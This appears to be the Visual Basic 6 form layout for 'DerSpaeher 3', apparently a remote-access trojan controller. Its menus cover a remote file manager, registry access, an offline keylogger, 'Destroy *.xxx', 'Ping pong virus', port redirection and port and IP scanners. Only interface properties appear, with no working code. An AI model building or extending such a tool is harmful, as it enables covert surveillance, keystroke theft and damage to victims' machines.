VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form DerSpaeher 
   BackColor       =   &H00000000&
   ClientHeight    =   5460
   ClientLeft      =   165
   ClientTop       =   165
   ClientWidth     =   9750
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Courier New"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H00000000&
   Icon            =   "ds3English!.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   5460
   ScaleWidth      =   9750
   Begin VB.PictureBox picMenue 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   5050
      Left            =   240
      ScaleHeight     =   5055
      ScaleWidth      =   2355
      TabIndex        =   0
      Top             =   390
      Width           =   2350
      Begin MSWinsockLib.Winsock tcp1 
         Left            =   1440
         Top             =   1320
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.PictureBox picFunktionen 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   1620
         Index           =   4
         Left            =   240
         ScaleHeight     =   1620
         ScaleWidth      =   1800
         TabIndex        =   20
         Top             =   2520
         Visible         =   0   'False
         Width           =   1800
         Begin MSWinsockLib.Winsock portr 
            Left            =   600
            Top             =   0
            _ExtentX        =   741
            _ExtentY        =   741
            _Version        =   393216
         End
         Begin MSWinsockLib.Winsock wskclient 
            Left            =   1080
            Top             =   480
            _ExtentX        =   741
            _ExtentY        =   741
            _Version        =   393216
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Destroy *.xxx"
            ForeColor       =   &H00FFFF80&
            Height          =   210
            Index           =   26
            Left            =   120
            TabIndex        =   387
            Top             =   1080
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "ICQ"
            ForeColor       =   &H00FFFF80&
            Height          =   210
            Index           =   11
            Left            =   120
            TabIndex        =   265
            Top             =   720
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "(Inter)Net"
            ForeColor       =   &H00FFFF80&
            Height          =   210
            Index           =   24
            Left            =   120
            TabIndex        =   170
            Top             =   360
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Xtras"
            ForeColor       =   &H00FFFF80&
            Height          =   210
            Index           =   16
            Left            =   120
            TabIndex        =   21
            Top             =   0
            Width           =   1575
         End
      End
      Begin VB.PictureBox picFunktionen 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   1620
         Index           =   3
         Left            =   240
         ScaleHeight     =   1620
         ScaleWidth      =   1800
         TabIndex        =   18
         Top             =   2520
         Visible         =   0   'False
         Width           =   1800
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "App redirect"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   17
            Left            =   120
            TabIndex        =   344
            Top             =   1080
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Port redirect"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   4
            Left            =   120
            TabIndex        =   332
            Top             =   720
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Dos script"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   25
            Left            =   120
            TabIndex        =   223
            Top             =   360
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "System infos"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   13
            Left            =   120
            TabIndex        =   19
            Top             =   0
            Width           =   1575
         End
      End
      Begin VB.PictureBox picFunktionen 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   1620
         Index           =   5
         Left            =   240
         ScaleHeight     =   1620
         ScaleWidth      =   1800
         TabIndex        =   27
         Top             =   2520
         Visible         =   0   'False
         Width           =   1800
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Server list"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   18
            Left            =   120
            TabIndex        =   373
            Top             =   840
            Width           =   1575
            WordWrap        =   -1  'True
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Online alert"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   19
            Left            =   120
            TabIndex        =   204
            Top             =   480
            Width           =   1575
            WordWrap        =   -1  'True
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Configuration"
            ForeColor       =   &H00FFFF80&
            Height          =   210
            Index           =   20
            Left            =   120
            TabIndex        =   28
            Top             =   120
            Width           =   1575
         End
      End
      Begin VB.PictureBox picFunktionen 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   1620
         Index           =   1
         Left            =   240
         ScaleHeight     =   1620
         ScaleWidth      =   1800
         TabIndex        =   22
         Top             =   2520
         Visible         =   0   'False
         Width           =   1800
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Ping pong virus"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   5
            Left            =   120
            TabIndex        =   26
            Top             =   1080
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Mouse"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   6
            Left            =   120
            TabIndex        =   25
            Top             =   360
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Cool stuff"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   7
            Left            =   120
            TabIndex        =   24
            Top             =   0
            Width           =   1650
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Play sounds"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   14
            Left            =   120
            TabIndex        =   23
            Top             =   720
            Width           =   1575
         End
      End
      Begin VB.PictureBox picFunktionen 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   1620
         Index           =   2
         Left            =   240
         ScaleHeight     =   1620
         ScaleWidth      =   1800
         TabIndex        =   15
         Top             =   2520
         Visible         =   0   'False
         Width           =   1800
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Keyboard"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   12
            Left            =   120
            TabIndex        =   342
            Top             =   720
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "chat"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   9
            Left            =   120
            TabIndex        =   17
            Top             =   360
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Msg manager"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   10
            Left            =   120
            TabIndex        =   16
            Top             =   0
            Width           =   1575
         End
      End
      Begin VB.PictureBox picFunktionen 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   1620
         Index           =   0
         Left            =   240
         ScaleHeight     =   1620
         ScaleWidth      =   1800
         TabIndex        =   1
         Top             =   2520
         Visible         =   0   'False
         Width           =   1800
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "File manager"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   0
            Left            =   120
            TabIndex        =   4
            Top             =   0
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Windows"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   1
            Left            =   120
            TabIndex        =   3
            Top             =   360
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Registry"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   3
            Left            =   120
            TabIndex        =   2
            Top             =   720
            Width           =   1575
         End
      End
      Begin VB.PictureBox picFunktionen 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   1620
         Index           =   6
         Left            =   240
         ScaleHeight     =   1620
         ScaleWidth      =   1800
         TabIndex        =   29
         Top             =   2520
         Visible         =   0   'False
         Width           =   1800
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "eXpert window"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   8
            Left            =   120
            TabIndex        =   400
            Top             =   1440
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Port scanner"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   2
            Left            =   120
            TabIndex        =   290
            Top             =   1080
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Ip scanner"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   23
            Left            =   120
            TabIndex        =   35
            Top             =   720
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Server options"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   21
            Left            =   120
            TabIndex        =   31
            Top             =   360
            Width           =   1575
         End
         Begin VB.Label lblFunktionen 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Connection"
            ForeColor       =   &H00FFFFC0&
            Height          =   210
            Index           =   22
            Left            =   120
            TabIndex        =   30
            Top             =   0
            Width           =   1575
         End
      End
      Begin VB.Image imgLogo 
         Height          =   1215
         Index           =   1
         Left            =   0
         Picture         =   "ds3English!.frx":030A
         Top             =   3720
         Width           =   210
      End
      Begin VB.Label lblAuswahl 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "homepage"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   7
         Left            =   735
         TabIndex        =   12
         Top             =   4180
         Width           =   840
      End
      Begin VB.Label lblAuswahl 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "mail me"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   8
         Left            =   795
         TabIndex        =   11
         Top             =   4470
         Width           =   735
      End
      Begin VB.Label lblAuswahl 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "info"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   9
         Left            =   915
         TabIndex        =   10
         Top             =   4725
         Width           =   420
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   200
         Index           =   7
         Left            =   315
         Shape           =   4  'Rounded Rectangle
         Top             =   4200
         Width           =   1695
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   195
         Index           =   8
         Left            =   315
         Shape           =   4  'Rounded Rectangle
         Top             =   4485
         Width           =   1695
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   195
         Index           =   9
         Left            =   315
         Shape           =   4  'Rounded Rectangle
         Top             =   4740
         Width           =   1695
      End
      Begin VB.Label lblAuswahl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Client"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   1
         Left            =   855
         TabIndex        =   14
         Top             =   480
         Width           =   630
      End
      Begin VB.Label lblAuswahl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Server"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   0
         Left            =   855
         TabIndex        =   13
         Top             =   120
         Width           =   630
      End
      Begin VB.Label lblAuswahl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "keys/messages"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   4
         Left            =   480
         TabIndex        =   9
         Top             =   1560
         Width           =   1380
      End
      Begin VB.Label lblAuswahl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "advanced"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   5
         Left            =   750
         TabIndex        =   8
         Top             =   1920
         Width           =   840
      End
      Begin VB.Label lblAuswahl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "fun stuff"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   3
         Left            =   660
         TabIndex        =   7
         Top             =   1200
         Width           =   975
      End
      Begin VB.Label lblAuswahl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "others..."
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   6
         Left            =   675
         TabIndex        =   6
         Top             =   2280
         Width           =   975
      End
      Begin VB.Label lblAuswahl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "files/windows"
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   2
         Left            =   480
         TabIndex        =   5
         Top             =   840
         Width           =   1380
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         FillColor       =   &H00808000&
         Height          =   255
         Index           =   0
         Left            =   195
         Shape           =   4  'Rounded Rectangle
         Top             =   120
         Width           =   1935
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   255
         Index           =   1
         Left            =   195
         Shape           =   4  'Rounded Rectangle
         Top             =   480
         Width           =   1935
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   255
         Index           =   2
         Left            =   195
         Shape           =   4  'Rounded Rectangle
         Top             =   840
         Width           =   1935
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   255
         Index           =   3
         Left            =   195
         Shape           =   4  'Rounded Rectangle
         Top             =   1200
         Width           =   1935
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   255
         Index           =   4
         Left            =   195
         Shape           =   4  'Rounded Rectangle
         Top             =   1560
         Width           =   1935
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   255
         Index           =   5
         Left            =   195
         Shape           =   4  'Rounded Rectangle
         Top             =   1920
         Width           =   1935
      End
      Begin VB.Shape shpButton 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   255
         Index           =   6
         Left            =   195
         Shape           =   4  'Rounded Rectangle
         Top             =   2280
         Width           =   1935
      End
      Begin VB.Image imgLogo 
         Height          =   1215
         Index           =   0
         Left            =   2040
         Picture         =   "ds3English!.frx":0404
         Top             =   3720
         Width           =   210
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00C0C000&
         X1              =   1920
         X2              =   1920
         Y1              =   360
         Y2              =   2280
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00C0C000&
         X1              =   360
         X2              =   360
         Y1              =   360
         Y2              =   2280
      End
   End
   Begin VB.PictureBox picTitelLeiste 
      Align           =   1  'Align Top
      Appearance      =   0  'Flat
      BackColor       =   &H00808000&
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   0
      Picture         =   "ds3English!.frx":04FE
      ScaleHeight     =   225
      ScaleWidth      =   9720
      TabIndex        =   32
      Top             =   0
      Width           =   9750
      Begin VB.Label lblStandarts 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "DerSpaeher 3 v0.1 - programmed by: PhilippP"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   1
         Left            =   360
         TabIndex        =   33
         Top             =   0
         Width           =   4515
      End
      Begin VB.Image imgSchliessen 
         Height          =   480
         Left            =   9480
         Picture         =   "ds3English!.frx":199A
         Top             =   0
         Width           =   480
      End
      Begin VB.Image imgMinimieren 
         Height          =   480
         Left            =   9120
         Picture         =   "ds3English!.frx":1CA4
         Top             =   0
         Width           =   480
      End
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   9840
      Top             =   5400
   End
   Begin VB.TextBox Action 
      Height          =   315
      Left            =   600
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   214
      Top             =   1080
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Timer Timer5 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   9840
      Top             =   5400
   End
   Begin VB.Timer Time5 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   1920
      Top             =   840
   End
   Begin VB.TextBox Text3 
      Height          =   315
      Left            =   9840
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   215
      Top             =   5400
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   32
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   291
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin MSWinsockLib.Winsock tcp 
         Index           =   0
         Left            =   240
         Top             =   120
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00000000&
         Height          =   375
         Index           =   32
         Left            =   4080
         TabIndex        =   298
         Text            =   "127.0.0.1"
         Top             =   720
         Width           =   2235
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00000000&
         Height          =   375
         Index           =   31
         Left            =   1320
         MaxLength       =   6
         TabIndex        =   296
         Text            =   "1"
         Top             =   720
         Width           =   1395
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00000000&
         Height          =   2175
         Index           =   33
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   294
         Top             =   1200
         Width           =   6690
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "delete"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   25
         Left            =   5385
         TabIndex        =   300
         Top             =   3495
         Width           =   1245
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "stop"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   24
         Left            =   2760
         TabIndex        =   299
         Top             =   3495
         Width           =   1935
      End
      Begin VB.Label Label32 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "ip adress:"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Left            =   2880
         TabIndex        =   297
         Top             =   840
         Width           =   1050
      End
      Begin VB.Label Label31 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "start port:"
         ForeColor       =   &H00FFFF00&
         Height          =   210
         Left            =   120
         TabIndex        =   295
         Top             =   840
         Width           =   1155
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "start"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   23
         Left            =   240
         TabIndex        =   293
         Top             =   3495
         Width           =   1935
      End
      Begin VB.Label Label30 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "PORT SCANNER"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1935
         TabIndex        =   292
         Top             =   0
         Width           =   3075
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   23
         Left            =   120
         Shape           =   2  'Oval
         Top             =   3480
         Width           =   2175
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   24
         Left            =   2640
         Shape           =   2  'Oval
         Top             =   3480
         Width           =   2175
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   25
         Left            =   5280
         Shape           =   2  'Oval
         Top             =   3480
         Width           =   1455
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   32
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   25
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   218
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox Text6 
         Appearance      =   0  'Flat
         BackColor       =   &H00404000&
         ForeColor       =   &H00FFFFFF&
         Height          =   2895
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   219
         Top             =   600
         Width           =   6735
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "back"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   29
         Left            =   180
         TabIndex        =   221
         Top             =   3615
         Width           =   1785
      End
      Begin VB.Label Label23 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SHOW FILE"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2310
         TabIndex        =   220
         Top             =   0
         Width           =   2325
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   29
         Left            =   120
         Shape           =   2  'Oval
         Top             =   3600
         Width           =   1935
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   25
         Left            =   0
         Top             =   480
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   31
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   322
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label Label34 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "To see the offline keylogger file, go to the file manager and download it (the standart name ist regkey.dat)"
         ForeColor       =   &H00C0C000&
         Height          =   420
         Index           =   1
         Left            =   120
         TabIndex        =   329
         Top             =   2280
         Width           =   6615
         WordWrap        =   -1  'True
      End
      Begin VB.Label Label34 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Click on ""on"" to activate the offline keylogger and on ""off"" to disactivate the offline keylogger..."
         ForeColor       =   &H00C0C000&
         Height          =   420
         Index           =   0
         Left            =   240
         TabIndex        =   328
         Top             =   720
         Width           =   6510
         WordWrap        =   -1  'True
      End
      Begin VB.Label lblTast 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "status"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   327
         Top             =   3240
         Width           =   6735
      End
      Begin VB.Label lblTast 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "clear the file"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   326
         Top             =   2880
         Width           =   6735
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "on"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   27
         Left            =   240
         TabIndex        =   325
         Top             =   1695
         Width           =   2025
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "off"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   26
         Left            =   4560
         TabIndex        =   324
         Top             =   1695
         Width           =   2025
      End
      Begin VB.Label Label33 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "OFFLINE KEYLOGGER"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
